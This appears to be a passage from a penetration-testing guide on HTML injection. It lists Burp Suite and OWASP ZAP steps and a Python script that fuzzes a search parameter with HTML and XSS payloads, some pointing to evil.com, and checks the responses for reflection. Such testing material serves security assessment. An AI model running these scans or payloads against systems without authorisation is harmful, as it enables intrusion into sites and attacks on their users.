# Phase 9: Automated Testing

#### Using Burp Suite

```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
7. Manually verify successful injections
```

#### Using OWASP ZAP

```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```